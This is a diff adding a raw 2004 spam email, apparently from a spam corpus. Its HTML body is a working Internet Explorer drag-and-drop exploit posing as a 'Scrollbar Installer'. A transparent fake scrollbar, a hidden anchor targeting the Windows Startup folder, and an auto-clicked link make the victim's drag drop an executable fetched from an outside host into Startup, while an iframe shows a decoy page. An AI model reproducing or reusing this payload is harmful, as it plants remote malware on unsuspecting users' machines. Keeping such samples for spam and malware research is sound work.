@@ -1,0 +1,139 @@
+From: <huscof@hibbert.com.au>
+Date: Wed, 6 Oct 2004 06:44:03 +0300
+MIME-Version: 1.0
+Content-Type: text/html;
+	charset="iso-8859-7"
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3
+X-MSMail-Priority: Normal
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2900.2527
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html; =
+charset=3Diso-8859-7">
+<META NAME=3D"Generator" CONTENT=3D"MS Exchange Server version =
+6.5.7036.0">
+<TITLE></TITLE>
+</HEAD>
+<BODY>
+<!-- Converted from text/plain format -->
+
+<P><FONT SIZE=3D2>Wed, 6 Oct 2004 04:02:01 +0000<BR>
+Message-ID: &lt;6713551097035321@200.85.194.119.DSL.surnet.cl&gt;<BR>
+From: &quot;Candida&quot; &lt;huscof@hibbert.com.au&gt;<BR>
+To: &quot;Nancy&quot; &lt;paliourg@iit.demokritos.gr&gt;<BR>
+Subject: Impotant!<BR>
+Date: Wed, 6 Oct 2004 04:02:01 +0000<BR>
+MIME-Version: 1.0<BR>
+Content-Type: text/html; charset=3D&quot;iso-8859-1&quot;<BR>
+Content-Transfer-Encoding: 8bit<BR>
+User-Agent: Internet Messaging Program (IMP) 3.2.2<BR>
+X-Originating-IP: 100.154.147.207<BR>
+<BR>
+&lt;HTML&gt;&lt;html&gt;<BR>
+&lt;head&gt;<BR>
+&lt;title&gt;Scrollbar Installer Version 1.1&lt;/title&gt;<BR>
+&lt;style&gt;<BR>
+body {<BR>
+&nbsp;&nbsp;&nbsp; margin:0px;<BR>
+&nbsp;&nbsp;&nbsp; padding:0px;<BR>
+&nbsp;&nbsp;&nbsp; overflow:hidden;<BR>
+}<BR>
+a {<BR>
+&nbsp;&nbsp;&nbsp; behavior:url(#default#AnchorClick);<BR>
+}<BR>
+&lt;/style&gt;<BR>
+&lt;/head&gt;<BR>
+&lt;body onSelectStart=3D&quot;return false;&quot; =
+onContextMenu=3D&quot;return false;&quot;&gt;<BR>
+&lt;img id=3D&quot;dyn&quot; dynsrc=3D&quot;<A =
+HREF=3D"http://www.neofazis.biz/cht.exe">http://www.neofazis.biz/cht.exe<=
+/A>&quot; border=3D&quot;0&quot; =
+style=3D&quot;filter:alpha(opacity=3D0);z-index:10;width:30px;height:100%=
+;position:absolute;padding: 0px 0px 0px 0px;right:0px;top:0;&quot; =
+onDragStart=3D&quot;startDrag();&quot;&nbsp; =
+onDragEnd=3D&quot;endDrag();&quot; =
+onClick=3D&quot;startClick()&quot;&gt;<BR>
+&lt;div id=3D&quot;client&quot; =
+style=3D&quot;z-index:2;visibility:hidden;width:5px;height:5px;overflow:h=
+idden;position:absolute;top:0;left:0;&quot;&gt;<BR>
+&nbsp;&nbsp;&nbsp; &lt;iframe name=3D&quot;clientframe&quot; =
+id=3D&quot;clientframe&quot; marginwidth=3D&quot;0&quot; =
+marginheight=3D&quot;0&quot; scrolling=3D&quot;no&quot; =
+frameborder=3D&quot;0&quot; =
+style=3D&quot;position:absolute;width:500px;height:500px;left:-400px;top:=
+-400px;border:0px;&quot;&gt;&lt;/iframe&gt;<BR>
+&lt;/div&gt;<BR>
+&lt;a folder=3D&quot;shell:startup&quot; =
+target=3D&quot;clientframe&quot; id=3D&quot;clientcall&quot; =
+style=3D&quot;display:none&quot;&gt;&lt;/a&gt;<BR>
+&lt;iframe src=3D&quot;<A =
+HREF=3D"http://www.neofazis.biz/frame.html">http://www.neofazis.biz/frame=
+.html</A>&quot; name=3D&quot;root&quot; id=3D&quot;root&quot; =
+width=3D&quot;100%&quot; height=3D&quot;100%&quot; =
+marginwidth=3D&quot;10&quot; marginheight=3D&quot;10&quot; =
+frameborder=3D&quot;0&quot; =
+style=3D&quot;z-index:1;&quot;&gt;&lt;/iframe&gt;<BR>
+&lt;script language=3D&quot;JavaScript&quot; =
+type=3D&quot;text/javascript&quot;&gt;<BR>
+var dragging =3D false;<BR>
+var done =3D false;<BR>
+document.body.onmouseover =3D function() {<BR>
+&nbsp;&nbsp;&nbsp; =
+follow(parseInt(event.clientX),parseInt(event.clientY))<BR>
+}<BR>
+document.body.ondragover =3D function () {<BR>
+&nbsp;&nbsp;&nbsp; =
+follow(parseInt(event.clientX),parseInt(event.clientY))<BR>
+}<BR>
+function follow(x,y) {<BR>
+&nbsp;&nbsp;&nbsp; if (dragging &amp;&amp; !done) {<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
+document.getElementById(&quot;client&quot;).style.left =3D =
+x-2+&quot;px&quot;;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; =
+document.getElementById(&quot;client&quot;).style.top&nbsp; =3D =
+y-2+&quot;px&quot;;<BR>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; scrollRoot(y);<BR>
+&nbsp;&nbsp;&nbsp; }<BR>
+}<BR>
+function startDrag() {<BR>
+&nbsp;&nbsp;&nbsp; dragging =3D true;<BR>
+&nbsp;&nbsp;&nbsp; =
+document.getElementById('client').style.visibility=3D'visible';<BR>
+&nbsp;&nbsp;&nbsp; return true;<BR>
+}<BR>
+function endDrag () {<BR>
+&nbsp;&nbsp;&nbsp; dragging =3D false;<BR>
+&nbsp;&nbsp;&nbsp; done =3D true;<BR>
+&nbsp;&nbsp;&nbsp; =
+document.getElementById('dyn').style.display=3D'none';<BR>
+&nbsp;&nbsp;&nbsp; =
+document.getElementById('client').style.visibility=3D'hidden';<BR>
+}<BR>
+function startClick() {<BR>
+&nbsp;&nbsp;&nbsp; scrollRoot(parseInt(event.clientY))<BR>
+&nbsp;&nbsp;&nbsp; return true;<BR>
+}<BR>
+function scrollRoot(y) {<BR>
+&nbsp;&nbsp;&nbsp; // probably the dumbest scrollbar emulation on this =
+planet ;)<BR>
+&nbsp;&nbsp;&nbsp; =
+frames[&quot;root&quot;].scrollTo(0,(frames[&quot;root&quot;].document.bo=
+dy.firstChild.offsetHeight/100*(y/document.getElementById(&quot;root&quot=
+;).offsetHeight*100)));<BR>
+}<BR>
+document.getElementById(&quot;clientcall&quot;).click()<BR>
+&lt;/script&gt;<BR>
+&lt;/body&gt;<BR>
+&lt;/html&gt;&lt;/HTML&gt;<BR>
+<BR>
+<BR>
+<BR>
+</FONT>
+</P>
+
+</BODY>
+</HTML>
